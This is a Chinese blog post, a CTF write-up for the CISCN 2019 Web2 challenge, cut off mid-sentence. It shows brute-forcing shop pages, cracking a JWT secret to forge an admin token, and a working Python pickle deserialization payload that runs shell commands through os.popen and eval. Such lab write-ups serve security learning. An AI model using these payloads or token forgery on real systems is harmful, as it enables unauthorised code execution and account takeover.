@@ -1,0 +1,1339 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="pickle反序列化2, wuk0Ng">
+    <meta name="description" content="wuk0Ng的个人博客">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>pickle反序列化2 | wuk0Ng</title>
+    <link rel="icon" type="image/jpeg" href="/shaoqing.jpg">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+   <style>
+    body{
+       background-image: url(/medias/my_background.jpg);
+       background-repeat:no-repeat;
+       background-size:cover;
+       background-attachment:fixed;
+    }
+</style>
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/jiushen.jpg" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">wuk0Ng</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/jiushen.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">wuk0Ng</div>
+        <div class="logo-desc">
+            
+            wuk0Ng的个人博客
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/web-wuk0Ng" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/web-wuk0Ng" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">pickle反序列化2</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%AF%94%E8%B5%9B/">
+                                <span class="chip bg-color">比赛</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E8%AE%B0%E5%BD%95/" class="post-category">
+                                记录
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2025-07-18
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="CISCN-2019华北Day1-Web2"><a href="#CISCN-2019华北Day1-Web2" class="headerlink" title="[CISCN 2019华北Day1]Web2"></a>[CISCN 2019华北Day1]Web2</h1><p>首先我们打开插件看下，flask的web框架<br>然后就是我们要花钱买东西，接下来基本就确定是要伪造一个session了<br>但是这里的思路是错的，哈哈<br>当时意识到了一点不对劲<br>具体就是我们要买到等级6，但是，这里面的这个买不到等级6<br>不然怎么买？重复很多次？但是这里没有设计可以增加经验不断买的地方<br>还有就是抓包，有很多很多的数据，这里该怎么处理？<br>实际上可以一次性就买到等级6了<br>但是，也是因为刚才卡了一下的缘故，是可以点击下一页的<br>此时注意url栏</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28363/shop?page=3</span><br></pre></td></tr></table></figure>
+<p>还有就是，点击这个图片，找到我们需要的地方</p>
+<p><img src="https://github.com/web-wuk0Ng/my-images/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-17%20143235.png?raw=true"></p>
+<p>看到b站会员对应的这个lv4.png了吗<br>那我们也是可以找到等级6的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://node4.anna.nssctf.cn:28363/shop?page=&#x27;</span><br><span class="line"></span><br><span class="line">for i in range(500):</span><br><span class="line">    u = url + str(i);</span><br><span class="line">    try:</span><br><span class="line">        response = requests.get(u)</span><br><span class="line">        if &#x27;lv6.png&#x27; in response.text:</span><br><span class="line">            print(i)</span><br><span class="line">            break</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>运行脚本，找到page180是我们需要的<br>然后最后的结算页面，思路还是需要一些技巧或者多次尝试。我们可以将discount修改为一些比较小的数字<br>得到一个需要admin访问的页面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28363/b1g_m4mber</span><br></pre></td></tr></table></figure>
+<p>抓包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /b1g_m4mber HTTP/1.1</span><br><span class="line">Host: node4.anna.nssctf.cn:28363</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.102 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://node4.anna.nssctf.cn:28363/shopcar</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: _xsrf=2|f5bfef8d|a0611b6d13ef21f5e64096ddda4f1f33|1752731473; JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjIifQ.rLD0MmVRNL4EWKNbRkE6QNny8Afs6YPnGqrZ7cKc_jo; commodity_id=&quot;2|1:0|10:1752734508|12:commodity_id|8:MTYyNA==|b35dc01a033f45636c71a0f93d1043f7ec1b1634540c1d743eb334f9d4b858d4&quot;</span><br><span class="line">If-None-Match: &quot;c63998d5bdcbf56c96cd396256e18ee05bfc4f3e&quot;</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>我们猜测是修改jwt来成为admin权限<br>我们使用一个工具，上一篇博客中有详细介绍，这里只给出了指令<br>encode</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py encode -s &#x27;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#x27; -t &#x27;&#123;&quot;number&quot;:&quot;326410031505&quot;,&quot;username&quot;:&quot;admin&quot;&#125;&#x27;</span><br><span class="line">eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw</span><br></pre></td></tr></table></figure>
+<p>decode,with secret key</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py decode -c &#x27;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#x27; -s &#x27;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#x27;</span><br><span class="line">&#123;u&#x27;username&#x27;: &#x27;admin&#x27;, u&#x27;number&#x27;: &#x27;326410031505&#x27;&#125;</span><br></pre></td></tr></table></figure>
+<p>without secret key </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py decode -c &#x27;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#x27;</span><br><span class="line">&#123;&quot;number&quot;:&#123;&quot; b&quot;:&quot;MzI2NDEwMDMxNTA1&quot;&#125;,&quot;username&quot;:&#123;&quot; b&quot;:&quot;YWRtaW4=&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>我们使用这个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 session2.py decode -c &#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjIifQ.rLD0MmVRNL4EWKNbRkE6QNny8Afs6YPnGqrZ7cKc_jo&#x27;</span><br></pre></td></tr></table></figure>
+<p>之前架构可以看见是py2的<br>不对，这个是不能得到key的<br>我们需要使用另外的工具<br><a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a><br>这个是下载地址<br><a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker/blob/master/README.md">https://github.com/brendan-rius/c-jwt-cracker/blob/master/README.md</a><br>这是使用说明<br>这里我个人是安装了一些东西才搞定的<br>一个是安装gcc编辑器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc</span><br></pre></td></tr></table></figure>
+<p>还有一个就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install libssl-dev</span><br></pre></td></tr></table></figure>
+<p>安装make</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install make</span><br></pre></td></tr></table></figure>
+<p>最后进入c-jwt-cracker-master目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure>
+<p>最后再运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/c-jwt-cracker-master]</span><br><span class="line">└─# make</span><br><span class="line">gcc -I /usr/include/openssl -g -std=gnu99 -O3   -c -o main.o main.c</span><br><span class="line">gcc -I /usr/include/openssl -g -std=gnu99 -O3   -c -o base64.o base64.c</span><br><span class="line">gcc -o jwtcrack main.o base64.o -lssl -lcrypto -lpthread</span><br><span class="line">                                                                                </span><br><span class="line">┌──(root㉿kali)-[~/c-jwt-cracker-master]</span><br><span class="line">└─# ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjIifQ.rLD0MmVRNL4EWKNbRkE6QNny8Afs6YPnGqrZ7cKc_jo</span><br><span class="line">Secret is &quot;1Kun&quot;</span><br><span class="line">                </span><br></pre></td></tr></table></figure>
+<p>最后我们得到了1Kun是我们的密钥<br>后面应该只需要进入文件夹执行最后一个命令就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 session2.py decode -c &#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InJvb3QifQ.rkfdrSPds2mlAE-mjnsadSJW3LocWSs2OkMXInhVZsQ&#x27; -s &#x27;1Kun&#x27;</span><br></pre></td></tr></table></figure>
+<p>但是这个好像是不可以的<br>其实这一步我们是想要知道他的结构是什么样的，就是，是{‘username’:’root’}还是{‘username’:’name’}还是{‘_fresh’: True, ‘_id’: ‘3f8f9b00cc45f84f46d46e47e6c03572d236cafb2debb2d2cffb13034b5b2cdc0090077c6c0351d666e92fcacf91fa928ab81c8fcc83985cde3e4cd24b6a8e40’, ‘_user_id’: ‘1’, ‘time’: ‘datetime.datetime(2025, 7, 16, 10, 53, 24, tzinfo&#x3D;datetime.timezone.utc)’}<br>这种</p>
+<p>这里我们使用之前的一个方法，放入cyverchef里面<br>我们进行base64解码之后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;&#123;&quot;username&quot;:&quot;1&quot;&#125;.&quot;`Î..@0àÚc¤ÿ-.~Ì.¶h.¨üa.è³=Ð®´</span><br></pre></td></tr></table></figure>
+<p>然后我们看了看到对不上的原因应该就是这里是先有一个{“alg”:”HS256”,”typ”:”JWT”},我们可以直接对最重要的部分进行修改就可以了<br>{“username”:”admin”}</p>
+<p><img src="https://github.com/web-wuk0Ng/my-images/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-17%20162922.png?raw=true"></p>
+<p>最后我们可以得到另外一个地址<br>还有就是这个，如果我们已经知道这个session的组成部分，我们直接给这个session的关键部分换一个位置。当然，都知道关键部分的位置这些信息了，也没有必要用session2那个脚本了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/static/asd1f654e683wq/www.zip</span><br></pre></td></tr></table></figure>
+<p>访问<br>然后进行审计，得到有用的信息，审计admin文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import tornado.web</span><br><span class="line">from sshop.base import BaseHandler</span><br><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AdminHandler(BaseHandler):</span><br><span class="line">    @tornado.web.authenticated</span><br><span class="line">    def get(self, *args, **kwargs):</span><br><span class="line">        if self.current_user == &quot;admin&quot;:</span><br><span class="line">            return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0)</span><br><span class="line">        else:</span><br><span class="line">            return self.render(&#x27;no_ass.html&#x27;)</span><br><span class="line"></span><br><span class="line">    @tornado.web.authenticated</span><br><span class="line">    def post(self, *args, **kwargs):</span><br><span class="line">        try:</span><br><span class="line">            become = self.get_argument(&#x27;become&#x27;)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            return self.render(&#x27;form.html&#x27;, res=p, member=1)</span><br><span class="line">        except:</span><br><span class="line">            return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>主要是对这个become有一个pickle.loads()，也就是反序列化<br>我们就需要序列化这个，pickle.dumps<br>还有就是进行url编码的<br>urllib.unquote()</p>
+<p>urllib.quote() 是 Python 2 中的一个函数，用于对字符串进行 URL 编码（percent encoding）。它被用来将字符串中的特殊字符转换成符合 URL 格式的形式，以便在 URL 中进行安全传输或显示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">       return (eval, (&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line">print a</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>当然，这个脚本会报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">在 Python 2 中，urllib.quote() 是正确的写法；</span><br><span class="line">但在 Python 3 中，quote 函数被移到了 urllib.parse 模块中，直接使用 urllib.quote() 会提示 “没有该属性”。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>最后生成的脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib.parse</span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">       return (eval, (&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;,))</span><br><span class="line">a = pickle.dumps(payload(),protocol=0)</span><br><span class="line">print(urllib.parse.quote(a))</span><br></pre></td></tr></table></figure>
+<p>这个没有protocol生成的payload用不了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">在 pickle.dumps() 中，protocol=0 是指 使用 Python pickle 协议的版本 0。pickle 协议是 Python 用于序列化和反序列化对象的格式，不同版本的协议在兼容性、性能和特性上有所不同。</span><br><span class="line">各协议版本的主要区别</span><br><span class="line">协议版本	Python 支持	特点</span><br><span class="line">0	所有版本	人类可读的 ASCII 格式，兼容性最强，但效率最低。适合需要手动检查或与旧系统交互的场景。</span><br><span class="line">1	所有版本	二进制格式，比协议 0 更高效，但不支持某些高级特性。</span><br><span class="line">2	2.3+	引入对象状态保存优化，支持新类（new-style class）。</span><br><span class="line">3	3.0+	默认 Python 3 协议，明确支持 bytes 类型。</span><br><span class="line">4	3.4+	支持更大对象、自定义类型和扩展 pickle 格式。</span><br><span class="line">5	3.8+	增加对带外数据（out-of-band data）的支持，提升性能。</span><br><span class="line">为什么使用 protocol=0？</span><br><span class="line">在你的代码中，使用 protocol=0 的主要原因可能是：</span><br><span class="line"></span><br><span class="line">    兼容性需求：生成的 pickle 数据需要被旧版本 Python 解析。</span><br><span class="line">    可读性：协议 0 的输出是 ASCII 格式，便于调试或手动分析。</span><br><span class="line">    安全测试：在某些漏洞利用场景（如 pickle 反序列化漏洞）中，使用简单协议可以避免兼容性问题。</span><br><span class="line"></span><br><span class="line">对比示例</span><br><span class="line">协议 0（ASCII 格式）</span><br><span class="line">python</span><br><span class="line">运行</span><br><span class="line"></span><br><span class="line">import pickle</span><br><span class="line">data = 